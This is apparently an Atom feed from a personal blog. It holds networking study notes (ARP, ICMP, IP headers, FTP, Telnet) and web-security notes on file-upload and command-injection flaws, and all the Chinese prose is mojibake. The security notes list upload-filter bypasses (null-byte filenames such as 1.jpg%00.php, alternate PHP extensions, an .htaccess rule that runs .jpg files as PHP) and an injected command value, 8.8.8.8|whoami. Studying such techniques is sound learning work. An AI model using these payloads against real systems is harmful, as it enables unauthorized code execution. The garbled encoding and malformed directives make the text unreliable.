src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615194723467.png" alt="image-20200615194723467"></p><p>ä¼ çš„æ•°æ®ä¸º<strong>101001001</strong>/1101ä½™æ•°ä¸º0å°±ä¼šæ¥å—ã€‚</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615195101214.png" alt="image-20200615195101214"></p><h3 id="0x03ä¸¤ç§æƒ…å†µä¸‹çš„æ•°æ®é“¾è·¯å±‚"><a href="#0x03ä¸¤ç§æƒ…å†µä¸‹çš„æ•°æ®é“¾è·¯å±‚" class="headerlink" title="0x03ä¸¤ç§æƒ…å†µä¸‹çš„æ•°æ®é“¾è·¯å±‚"></a>0x03ä¸¤ç§æƒ…å†µä¸‹çš„æ•°æ®é“¾è·¯å±‚</h3><p><strong>ç‚¹åˆ°ç‚¹ä¿¡é“çš„æ•°æ®é“¾è·¯å±‚</strong>ï¼ˆå¹¿åŸŸç½‘ï¼‰</p><p>PPPåè®®</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615195355465.png" alt="image-20200615195355465"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615201603443.png" alt="image-20200615201603443"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615195843590.png" alt="image-20200615195843590"></p><p><strong>å¹¿æ’­ä¿¡é“çš„æ•°æ®é“¾è·¯å±‚</strong>ï¼ˆé›†çº¿å™¨ï¼‰</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615205445679.png" alt="image-20200615205445679"></p><h3 id="0x04ä»¥å¤ªç½‘"><a href="#0x04ä»¥å¤ªç½‘" class="headerlink" title="0x04ä»¥å¤ªç½‘"></a>0x04ä»¥å¤ªç½‘</h3><p>ä»¥å¤ªç½‘æ˜¯ä¸€ç§CSMA/CDçš„å±€åŸŸç½‘</p><p><strong>åª’ä½“æ¥å…¥æ§åˆ¶å±‚</strong>ï¼ˆMAC ï¼‰</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615211139871.png" alt="image-20200615211139871"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615211817436.png" alt="image-20200615211817436"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615212131635.png" alt="image-20200615212131635"></p><p>FCSæŠ“åŒ…ä¹‹åä¼šåˆ æ‰ã€‚</p><h3 id="0x05æ‰©å±•ä»¥å¤ªç½‘"><a href="#0x05æ‰©å±•ä»¥å¤ªç½‘" class="headerlink" title="0x05æ‰©å±•ä»¥å¤ªç½‘"></a>0x05æ‰©å±•ä»¥å¤ªç½‘</h3><p>é›†çº¿å™¨çº§è”ï¼Œä¼šä½¿ç½‘ç»œä¸­è®¡ç®—æœºæ•°é‡å¢åŠ ï¼Œä½†ä¼šä½¿å†²çªåŸŸå¢å¤§ï¼Œå¦‚ä½•ä¼˜åŒ–å‘¢ï¼Ÿ</p><p><strong>ç½‘æ¡¥</strong><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200615214530777.png" alt="image-20200615214530777"></p><p>ç½‘æ¡¥å°±æ˜¯äº¤æ¢æœºçš„å‰èº«ï¼Œäº¤æ¢æœºç›¸å½“äºç½‘æ¡¥å’Œé›†çº¿å™¨ã€‚</p><h3 id="0x06é«˜é€Ÿä»¥å¤ªç½‘"><a href="#0x06é«˜é€Ÿä»¥å¤ªç½‘" class="headerlink" title="0x06é«˜é€Ÿä»¥å¤ªç½‘"></a>0x06é«˜é€Ÿä»¥å¤ªç½‘</h3><h2 id="ç¬¬å››ç« -ç½‘ç»œå±‚"><a href="#ç¬¬å››ç« -ç½‘ç»œå±‚" class="headerlink" title="ç¬¬å››ç«  ç½‘ç»œå±‚"></a>ç¬¬å››ç«  ç½‘ç»œå±‚</h2><h3 id="0x01ç½‘ç»œå±‚æä¾›çš„æœåŠ¡"><a href="#0x01ç½‘ç»œå±‚æä¾›çš„æœåŠ¡" class="headerlink" title="0x01ç½‘ç»œå±‚æä¾›çš„æœåŠ¡"></a>0x01ç½‘ç»œå±‚æä¾›çš„æœåŠ¡</h3><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200616110826298.png" alt="image-20200616110826298"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200616111607056.png" alt="image-20200616111607056"></p><p>ï¼ˆè·¯ç”±å™¨æ˜¯ç½‘ç»œå±‚è®¾å¤‡ï¼‰</p><p>ç½‘ç»œåœ°å€ç›¸åŒå°±å¯ä»¥çœ‹æˆä¸€ä¸ª<strong>ç½‘æ®µ</strong>ï¼Œæ€ä¹ˆçœ‹ç½‘ç»œåœ°å€å‘¢ï¼Ÿå¯ä»¥çœ‹å­ç½‘æ©ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ip:10.0.0.1</span><br><span class="line">å­ç½‘æ©ç :255.0.0.0</span><br><span class="line">&#x2F;&#x2F;æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹å‡ºå­ç½‘æ©ç æ˜¯255ï¼Œé‚£è¡¨æ˜ipåœ°å€ä¸­10å°±æ˜¯ç½‘ç»œåœ°å€ã€‚</span><br><span class="line"></span><br><span class="line">ip:12.0.0.1</span><br><span class="line">å­ç½‘æ©ç 255.255.0.0</span><br><span class="line">&#x2F;&#x2F;255.255.0.0è¯´æ˜åœ¨è¿™ä¸ªç½‘æ®µä¸­12.0æ˜¯ç½‘ç»œåœ°å€</span><br><span class="line"></span><br><span class="line">ç½‘å…³ï¼šè·¯ç”±å™¨ä¸Šé…ç½®ï¼Œä¸€èˆ¬ä¸ºè¯¥ç½‘æ®µä¸­çš„ç¬¬ä¸€ä¸ªåœ°å€ï¼Œå®é™…ä¸Šä»»æ„ä¸€ä¸ªåœ°å€éƒ½å¯ä»¥ã€‚</span><br><span class="line"></span><br><span class="line">è·¯ç”±å™¨ï¼šè·¯ç”±å™¨æ˜¯æ— æ³•çŸ¥é“å®ƒå…·ä½“ç½‘æ®µçš„ä½ç½®ï¼Œéœ€è¦æ·»åŠ è·¯ç”±è¡¨ã€‚</span><br></pre></td></tr></table></figure><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200616114228562.png" alt="image-20200616114228562"></p><h3 id="0x02ç½‘ç»œè®¾å¤‡å’ŒOSIå‚è€ƒæ¨¡å‹"><a href="#0x02ç½‘ç»œè®¾å¤‡å’ŒOSIå‚è€ƒæ¨¡å‹" class="headerlink" title="0x02ç½‘ç»œè®¾å¤‡å’ŒOSIå‚è€ƒæ¨¡å‹"></a>0x02ç½‘ç»œè®¾å¤‡å’ŒOSIå‚è€ƒæ¨¡å‹</h3><p>å‘é€ç«¯ï¼š</p><ol><li><p>åº”ç”¨å±‚ ç¨‹åºå‡†å¤‡è¦ä¼ è¾“çš„æ–‡ä»¶</p></li><li><p>ä¼ è¾“å±‚ å°†æ–‡ä»¶ç¼–å·</p></li><li><p>ç½‘ç»œå±‚ æ·»åŠ IPåœ°å€</p></li><li><p>æ•°æ®é“¾è·¯å±‚  æœ‰ä¸¤ç§æƒ…å†µ </p><p>ç¬¬ä¸€ç§ é€šè¿‡å­ç½‘æ©ç  ï¼Œåˆ¤æ–­æ˜¯å¦æ˜¯åŒä¸€ä¸ªç½‘æ®µã€‚å¦‚æœæ˜¯ï¼Œåˆ©ç”¨ARPåè®®å¹¿æ’­è§£æç›®æ ‡ipåœ°å€çš„MACåœ°å€</p><p>ç¬¬äºŒç§</p></li></ol><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200617112108377.png" alt="image-20200617112108377"></p><h3 id="0x03ç½‘ç»œå±‚åè®®"><a href="#0x03ç½‘ç»œå±‚åè®®" class="headerlink" title="0x03ç½‘ç»œå±‚åè®®"></a>0x03ç½‘ç»œå±‚åè®®</h3><h4 id="ARPåè®®"><a href="#ARPåè®®" class="headerlink" title="ARPåè®®"></a><strong>ARPåè®®</strong></h4><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200617113421057.png" alt="image-20200617113421057"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp -a  &#x2F;&#x2F;æŸ¥è¯¢macåœ°å€</span><br><span class="line">arp -s ipåœ°å€ macåœ°å€   &#x2F;&#x2F;é…ç½®IPåœ°å€çš„MACåœ°å€</span><br></pre></td></tr></table></figure><p>arpåè®®:å°†ipåœ°å€é€šè¿‡å¹¿æ’­ ç›®æ ‡MACåœ°å€æ˜¯FF-FF-FF-FF-FF-FF<strong>è§£æç›®æ ‡ipåœ°å€çš„MACåœ°å€</strong></p><p>arpæ¬ºéª—: æ•°æ®é“¾è·¯å±‚æ•…éšœï¼Œç¼“å­˜äº†é”™è¯¯çš„MACåœ°å€</p><h4 id="ç½‘é™…æ§åˆ¶æŠ¥æ–‡åè®®ï¼ˆICMPï¼‰"><a href="#ç½‘é™…æ§åˆ¶æŠ¥æ–‡åè®®ï¼ˆICMPï¼‰" class="headerlink" title="ç½‘é™…æ§åˆ¶æŠ¥æ–‡åè®®ï¼ˆICMPï¼‰"></a><strong>ç½‘é™…æ§åˆ¶æŠ¥æ–‡åè®®</strong>ï¼ˆICMPï¼‰</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ping      ttl&#x3D;64 linux</span><br><span class="line">128 windows</span><br><span class="line">255 unix</span><br><span class="line">ping www.baidu.com -t    ä¸€ç›´ping</span><br><span class="line">ping www.baidu.com -l 200   å®šä¹‰æ•°æ®åŒ…çš„å¤§å°</span><br><span class="line">&#x2F;&#x2F;æŸ¥çœ‹è·¯ç”±å™¨çš„åœ°å€</span><br><span class="line">ping 8.8.8.8 -i 1 æ›´æ”¹æ•°æ®åŒ…ttlæ—¶é—´ï¼Œå¯ä»¥è·Ÿè¸ªé€”ç»çš„è·¯ç”±å™¨</span><br><span class="line">pathping   è·Ÿè¸ªpingçš„è·¯å¾„</span><br><span class="line">tracert    ç›´æ¥è·Ÿè¸ªè·¯ç”±</span><br></pre></td></tr></table></figure><h4 id="IGMP"><a href="#IGMP" class="headerlink" title="IGMP"></a>IGMP</h4><p>é…ç½®åœ¨è·¯ç”±å™¨ä¸Šæ‰«æå¤šæ’­åœ°å€çš„åè®®</p><p>å¹¿æ’­ï¼šç›®æ ‡ipåœ°å€æ˜¯å…¨ffï¼Œç›®æ ‡macåœ°å€æ˜¯255ï¼Œå‘å±€åŸŸç½‘å†…æ‰€æœ‰è®¡ç®—æœºå‘å‡ºå¹¿æ’­</p><p>ç‚¹åˆ°ç‚¹ï¼šä»ä¸€ä¸ªç‚¹åˆ°å¦ä¸€ä¸ªç‚¹</p><p>ç»„æ’­ï¼šä¸€å¯¹å¤š</p><h3 id="0x04æ•°æ®åŒ…"><a href="#0x04æ•°æ®åŒ…" class="headerlink" title="0x04æ•°æ®åŒ…"></a>0x04æ•°æ®åŒ…</h3><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200619111139014.png" alt="image-20200619111139014"></p><p>ç‰ˆæœ¬ï¼šç”¨æ¥è¡¨ç¤ºTCP/IPåè®®çš„ç‰ˆæœ¬ v4 v6</p><p>åŒºåˆ†æœåŠ¡ï¼šçœ‹è°çš„ä¼˜å…ˆçº§é«˜</p><p>æ ‡è¯†ï¼š100 100 100å°±ä¸ºä¸€ä¸ªæ•°æ®åŒ…</p><p>æ ‡å¿—ï¼šçœ‹æ•°æ®åŒ…æ˜¯å¦åˆ†ç‰‡<img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200619112943227.png" alt="image-20200619112943227"></p><p>ç”Ÿå­˜æ—¶é—´ï¼ˆTTLï¼‰ï¼šæ¯è¿‡ä¸€ä¸ªè·¯ç”±å™¨ï¼Œç”Ÿå­˜æ—¶é—´ä¼šä¿®æ”¹ã€‚</p><p>åè®®å·ï¼šäº¤ç»™å“ªä¸ªåè®®è¿›è¡Œå¤„ç†</p><p>ï¼ˆICMP 1      IGMP  2       TCP  6        UDP  17  IPv6   41       OSPF   89ï¼‰</p><p>æ•°æ®é“¾è·¯å±‚æ”¯æŒæ•°æ®åŒ…1500å­—èŠ‚</p><p>IPå±‚æ”¯æŒæ•°æ®åŒ…æ˜¯65535å­—èŠ‚ï¼Œæ‰€ä»¥éœ€è¦åˆ†ç‰‡ä¼ è¾“ï¼Œä½†ä¸€èˆ¬ä¸ä¼šè¶…è¿‡1500å­—èŠ‚ã€‚</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200619111512690.png" alt="image-20200619111512690"></p><h1 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h1><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807090006669.png" alt="image-20200807090006669"></p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807090512480.png" alt="image-20200807090512480"></p><p><strong>Active Mode</strong></p><p>ç¬¬äºŒä¿¡é“æ˜¯æœåŠ¡å™¨ä¸»åŠ¨å‘èµ·çš„ã€‚</p><p>ç¬¬ä¸€ä¿¡é“æ˜¯21ç«¯å£</p><p>ç¬¬äºŒä¿¡é“æ˜¯20ç«¯å£</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807100649933.png" alt="image-20200807100649933"></p><p><strong>Passive</strong></p><p>ç¬¬ä¸€ä¿¡é“æ˜¯21ç«¯å£</p><p>ç¬¬äºŒä¿¡é“æ˜¯éšæœºç«¯å£</p><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807100800469.png" alt="image-20200807100800469"></p><h1 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h1><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200807145634367.png" alt="image-20200807145634367"></p><p><strong>telnet</strong>çš„ç«¯å£æ˜¯23ç«¯å£</p><h1 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h1><p><img src="/2020/12/09/%E8%AE%A1%E7%BD%91/image-20200811154248708.png" alt="image-20200811154248708"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è¿™ä¸ªåªæœ‰è¿™ä¸€éƒ¨åˆ†äº†&lt;/p&gt;
&lt;p&gt;åé¢å­¦äº†ä½†å¥½åƒä¸¢äº†&lt;/p&gt;
&lt;p&gt;çœ‹å¤šä¼šå­¦åˆ°è®¡ç½‘æ—¶ï¼Œå†æ¥è¡¥è¿™ä¸€ç¯‡&lt;/p&gt;
&lt;h1 id=&quot;è®¡ç½‘åˆå­¦&quot;&gt;&lt;a href=&quot;#è®¡ç½‘åˆå­¦&quot; class=&quot;headerlink&quot; title=&quot;è®¡ç½‘åˆå­¦&quot;&gt;&lt;/a&gt;è®¡ç½‘åˆå­¦&lt;/h1&gt;&lt;h2 id=&quot;</summary>
      
    
    
    
    <category term="è®¡ç½‘" scheme="https://pz1o.top/categories/%E8%AE%A1%E7%BD%91/"/>
    
    
    <category term="è®¡ç½‘" scheme="https://pz1o.top/tags/%E8%AE%A1%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>æ–‡ä»¶ä¸Šä¼ </title>
    <link href="https://pz1o.top/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>https://pz1o.top/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2020-12-09T15:26:33.000Z</published>
    <updated>2020-12-09T15:27:06.160Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ä¸Šä¼ æ¼æ´"><a href="#ä¸Šä¼ æ¼æ´" class="headerlink" title="ä¸Šä¼ æ¼æ´"></a>ä¸Šä¼ æ¼æ´</h1><p><a href="https://www.andseclab.com/2018/12/01/%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e%e6%94%bb%e5%87%bb%e6%80%bb%e7%bb%93/" target="_blank" rel="noopener">https://www.andseclab.com/2018/12/01/%e4%b8%8a%e4%bc%a0%e6%bc%8f%e6%b4%9e%e6%94%bb%e5%87%bb%e6%80%bb%e7%bb%93/</a></p><h2 id="0x01åŸºæœ¬æµç¨‹"><a href="#0x01åŸºæœ¬æµç¨‹" class="headerlink" title="0x01åŸºæœ¬æµç¨‹"></a>0x01åŸºæœ¬æµç¨‹</h2><ol><li>å›¾ç‰‡æ˜¯å¦æ­£å¸¸ä¸Šä¼ ã€‚</li><li>å›¾ç‰‡ä¸Šä¼ å†…å®¹æ˜¯å¦è¢«æ„ŸæŸ“ã€‚ï¼ˆå†…å®¹æ›¿æ¢ æŠ“åŒ…æ”¹ï¼‰</li><li>ä¸Šä¼ çš„åŸŸåæ˜¯å¦æ˜¯ç›®æ ‡æœåŠ¡å™¨ã€‚</li><li>ä¸Šä¼ çš„ç›®å½•æ˜¯å¦æ”¯æŒè§£æ</li></ol><h2 id="0x02ç»•è¿‡js"><a href="#0x02ç»•è¿‡js" class="headerlink" title="0x02ç»•è¿‡js"></a>0x02ç»•è¿‡js</h2><h2 id="0x03æ–‡ä»¶ä¸Šä¼ ç©ºå­—èŠ‚"><a href="#0x03æ–‡ä»¶ä¸Šä¼ ç©ºå­—èŠ‚" class="headerlink" title="0x03æ–‡ä»¶ä¸Šä¼ ç©ºå­—èŠ‚"></a>0x03æ–‡ä»¶ä¸Šä¼ ç©ºå­—èŠ‚</h2><p>æŠ“åŒ…çš„æ—¶å€™ %00</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.jpg%00.php</span><br><span class="line">1.php%00.jpg</span><br></pre></td></tr></table></figure><h2 id="0x04æ–‡ä»¶ä¸Šä¼ åå•éªŒè¯"><a href="#0x04æ–‡ä»¶ä¸Šä¼ åå•éªŒè¯" class="headerlink" title="0x04æ–‡ä»¶ä¸Šä¼ åå•éªŒè¯"></a>0x04æ–‡ä»¶ä¸Šä¼ åå•éªŒè¯</h2><p>é»‘åå•ï¼šä¸å…è®¸ä»€ä¹ˆä¸Šä¼ </p><p>ç™½åå•ï¼šå…è®¸ä»€ä¹ˆä¸Šä¼ </p><p>å¯ä»¥å°è¯•php3 php4 php5 phtmlï¼Œphtä½¿ç”¨  æˆ–æœåŠ¡å™¨è§£ææ¼æ´</p><h2 id="0x05äºŒæ¬¡ä¸Šä¼ "><a href="#0x05äºŒæ¬¡ä¸Šä¼ " class="headerlink" title="0x05äºŒæ¬¡ä¸Šä¼ "></a>0x05äºŒæ¬¡ä¸Šä¼ </h2><h2 id="0x06MIME"><a href="#0x06MIME" class="headerlink" title="0x06MIME"></a>0x06MIME</h2><p>content-typeä¸­è¡¨ç¤ºäº†æ–‡ä»¶ç±»å‹ã€‚</p><h2 id="0x07è§£ææ¼æ´"><a href="#0x07è§£ææ¼æ´" class="headerlink" title="0x07è§£ææ¼æ´"></a>0x07è§£ææ¼æ´</h2><h3 id="iisè§£ææ¼æ´"><a href="#iisè§£ææ¼æ´" class="headerlink" title="iisè§£ææ¼æ´"></a>iisè§£ææ¼æ´</h3><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609194945742.png" alt="image-20200609194945742"></p><h3 id="apacheè§£ææ¼æ´"><a href="#apacheè§£ææ¼æ´" class="headerlink" title="apacheè§£ææ¼æ´"></a>apacheè§£ææ¼æ´</h3><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609195122633.png" alt="image-20200609195122633"></p><h3 id="nginxè§£ææ¼æ´"><a href="#nginxè§£ææ¼æ´" class="headerlink" title="nginxè§£ææ¼æ´"></a>nginxè§£ææ¼æ´</h3><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609195540127.png" alt="image-20200609195540127"></p><h3 id="netä¸Šä¼ "><a href="#netä¸Šä¼ " class="headerlink" title=".netä¸Šä¼ "></a>.netä¸Šä¼ </h3><p><img src="/2020/12/09/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200609200056116.png" alt="image-20200609200056116"></p><h3 id="phtmlä¸Šä¼ "><a href="#phtmlä¸Šä¼ " class="headerlink" title="phtmlä¸Šä¼ "></a>phtmlä¸Šä¼ </h3><p>åœ¨apacheé…ç½®æ–‡ä»¶ä¸­æ·»åŠ ï¼ˆhttpd.confï¼‰ä¸­æ·»åŠ </p><p>AddType application/x-httpd-php.phtml</p><p>è¿™æ ·phtmlåç¼€çš„æ–‡ä»¶å°±ä¼šæŒ‰ç…§phpå»è§£æ</p><h3 id="htaccessä¸Šä¼ "><a href="#htaccessä¸Šä¼ " class="headerlink" title=".htaccessä¸Šä¼ "></a>.htaccessä¸Šä¼ </h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files *.jpg&gt;</span><br><span class="line">ForceType:application&#x2F;x-httpd-php</span><br><span class="line">SetHandler:application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;Files&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;1.jpg</span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;ä¼šå°†æ‰€æœ‰çš„jpgæ–‡ä»¶éƒ½æŒ‰ç…§phpæ¥è§£æ</span><br></pre></td></tr></table></figure><h2 id="0x08åŒæ–‡ä»¶ä¸Šä¼ "><a href="#0x08åŒæ–‡ä»¶ä¸Šä¼ " class="headerlink" title="0x08åŒæ–‡ä»¶ä¸Šä¼ "></a>0x08åŒæ–‡ä»¶ä¸Šä¼ </h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ä¸Šä¼ æ¼æ´&quot;&gt;&lt;a href=&quot;#ä¸Šä¼ æ¼æ´&quot; class=&quot;headerlink&quot; title=&quot;ä¸Šä¼ æ¼æ´&quot;&gt;&lt;/a&gt;ä¸Šä¼ æ¼æ´&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://www.andseclab.com/2018/12/01/%e4%b8%8a%e4%bc%</summary>
      
    
    
    
    <category term="web" scheme="https://pz1o.top/categories/web/"/>
    
    
    <category term="web" scheme="https://pz1o.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>æ–‡ä»¶åŒ…å«</title>
    <link href="https://pz1o.top/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>https://pz1o.top/2020/12/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2020-12-09T15:21:27.000Z</published>
    <updated>2020-12-09T15:23:42.040Z</updated>
    
    <content type="html"><![CDATA[<p>ä»Šå¤©åœ¨æ•´ç†ç¡¬ç›˜çš„ä¸€äº›ä¸œè¥¿ï¼Œæœ‰äº›webå­¦çš„ä¸œè¥¿åˆä¸æƒ³æ‰”ï¼Œå°±ä¼ ä¸Šæ¥ã€‚</p><h1 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h1><h2 id="0x01å®šä¹‰"><a href="#0x01å®šä¹‰" class="headerlink" title="0x01å®šä¹‰"></a>0x01å®šä¹‰</h2><p>åœ¨é€šè¿‡æœåŠ¡å™¨è„šæœ¬çš„å‡½æ•°å¼•å…¥æ–‡ä»¶æ—¶ï¼Œç”±äºä¼ å…¥çš„æ–‡ä»¶åæ²¡æœ‰ç»è¿‡åˆç†çš„æ ¡éªŒï¼Œä»è€Œæ“ä½œäº†é¢„æƒ³ä¹‹å¤–çš„æ–‡ä»¶ï¼Œå¯¼è‡´æ„å¤–çš„æ–‡ä»¶æ³„éœ²ç”šè‡³æ¶æ„çš„ä»£ç æ³¨å…¥ã€‚</p><h2 id="0x02ç¯å¢ƒè¦æ±‚"><a href="#0x02ç¯å¢ƒè¦æ±‚" class="headerlink" title="0x02ç¯å¢ƒè¦æ±‚"></a>0x02ç¯å¢ƒè¦æ±‚</h2><ul><li>allow_url_fopen=On(é»˜è®¤ä¸ºOn) è§„å®šæ˜¯å¦å…è®¸ä»è¿œç¨‹æœåŠ¡å™¨æˆ–è€…ç½‘ç«™æ£€ç´¢æ•°æ®</li><li>allow_url_include=On(php5.2ä¹‹åé»˜è®¤ä¸ºOff) è§„å®šæ˜¯å¦å…è®¸include/requireè¿œç¨‹æ–‡ä»¶</li></ul><h2 id="0x03æ–‡ä»¶åŒ…å«å‡½æ•°"><a href="#0x03æ–‡ä»¶åŒ…å«å‡½æ•°" class="headerlink" title="0x03æ–‡ä»¶åŒ…å«å‡½æ•°"></a>0x03æ–‡ä»¶åŒ…å«å‡½æ•°</h2><ul><li>include():å¯è·å¾—æŒ‡å®šæ–‡ä»¶ä¸­çš„æ‰€æœ‰æ–‡æœ¬ï¼Œå¹¶æŠŠæ–‡æœ¬æ‹·è´åˆ°ä½¿ç”¨ include å‡½æ•°çš„æ–‡ä»¶ä¸­ã€‚include() å‡½æ•°<strong>ä¼šç”Ÿæˆä¸€ä¸ªè­¦å‘Šï¼Œä½†æ˜¯è„šæœ¬ä¼šç»§ç»­æ‰§è¡Œã€‚</strong></li><li>require():å‡½æ•°æ¥å—çš„æ‰€æœ‰æ–‡æœ¬æ–‡ä»¶,å¹¶å°†å®ƒå¤åˆ¶åˆ°æŒ‡å®šçš„æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨äº†åŒ…æ‹¬åŠŸèƒ½ã€‚å¦‚æœåœ¨åŠ è½½ä¸€ä¸ªæ–‡ä»¶æ—¶æœ‰ä»»ä½•é—®é¢˜ï¼Œ<strong>ç”Ÿæˆä¸€ä¸ªè‡´å‘½é”™è¯¯,åœæ­¢è„šæœ¬çš„æ‰§è¡Œã€‚</strong></li></ul><h2 id="0x04å‘½ä»¤æ‰§è¡Œ"><a href="#0x04å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="0x04å‘½ä»¤æ‰§è¡Œ"></a>0x04å‘½ä»¤æ‰§è¡Œ</h2><p><a href="https://www.ghtwf01.cn/index.php/archives/273/#menu_index_21" target="_blank" rel="noopener">https://www.ghtwf01.cn/index.php/archives/273/#menu_index_21</a></p><h3 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h3><p>åº”ç”¨æœ‰æ—¶éœ€è¦è°ƒç”¨ä¸€äº›æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼Œå¦‚PHPä¸­çš„systemã€execã€shell_execã€</p><p>passthruã€popenã€proc_popenç­‰ï¼Œå½“ç”¨æˆ·èƒ½æ§åˆ¶è¿™äº›å‡½æ•°ä¸­çš„å‚æ•°æ—¶ï¼Œå°±å¯ä»¥å°†æ¶æ„ç³»ç»Ÿå‘½ä»¤</p><p>æ‹¼æ¥åˆ°æ­£å¸¸å‘½ä»¤ä¸­ï¼Œä»è€Œé€ æˆå‘½ä»¤æ‰§è¡Œæ”»å‡»ï¼Œè¿™å°±æ˜¯å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p><h3 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><ul><li><p>åº”ç”¨è°ƒç”¨æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°</p></li><li><p>å°†ç”¨æˆ·è¾“å…¥ä½œä¸ºç³»ç»Ÿå‘½ä»¤çš„å‚æ•°æ‹¼æ¥åˆ°äº†å‘½ä»¤è¡Œä¸­</p></li><li><p>æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œè¿‡æ»¤æˆ–è¿‡æ»¤ä¸ä¸¥</p></li></ul><hr><h3 id="å¸¸ç”¨è¿æ¥ç¬¦"><a href="#å¸¸ç”¨è¿æ¥ç¬¦" class="headerlink" title="å¸¸ç”¨è¿æ¥ç¬¦"></a>å¸¸ç”¨è¿æ¥ç¬¦</h3><ul><li>åœ¨Windowså’ŒLinuxä¸­æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<strong>&amp;æ¥æ‰§è¡Œå¤šæ¡å‘½ä»¤ã€‚</strong></li><li><strong>|</strong>ï¼šå‰é¢å‘½ä»¤è¾“å‡ºç»“æœä½œä¸ºåé¢å‘½ä»¤çš„è¾“å…¥å†…å®¹ï¼›è¾“å…¥8.8.8.8|whoami 